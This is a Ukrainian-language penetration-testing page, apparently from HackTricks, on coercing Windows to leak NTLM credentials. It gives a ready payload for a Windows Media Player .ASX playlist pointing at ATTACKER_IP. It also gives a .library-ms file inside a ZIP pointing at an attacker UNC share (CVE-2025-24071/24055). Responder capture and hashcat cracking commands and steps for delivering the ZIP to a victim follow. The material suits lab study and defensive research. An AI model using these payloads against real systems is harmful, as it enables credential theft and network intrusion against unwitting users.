# Місця для викрадення NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Перегляньте всі чудові ідеї з [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — від завантаження Microsoft Word файлу онлайн до джерела ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md та [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player плейлисти (.ASX/.WAX)

Якщо ви змусите ціль відкрити або переглянути Windows Media Player плейлист, яким ви керуєте, ви можете leak Net‑NTLMv2, вказавши запис на UNC path. WMP спробує отримати вказане медіа через SMB і аутентифікується неявно.

Приклад payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Потік збору та cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer небезпечно обробляє файли .library-ms, коли вони відкриваються безпосередньо з ZIP-архіву. Якщо визначення бібліотеки вказує на віддалений UNC-шлях (наприклад, \\attacker\share), простий перегляд або запуск .library-ms всередині ZIP змушує Explorer перерахувати UNC і відправити NTLM-аутентифікацію на attacker. Це призводить до отримання NetNTLMv2, який можна зламати офлайн або потенційно relayed.

Мінімальний .library-ms, що вказує на attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Операційні кроки
- Створіть файл .library-ms з наведеним вище XML (вкажіть ваш IP/hostname).
- Заархівуйте його (on Windows: Send to → Compressed (zipped) folder) та доставте ZIP на target.
- Запустіть NTLM capture listener і чекайте, поки жертва відкриє .library-ms всередині ZIP.


## Джерела
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
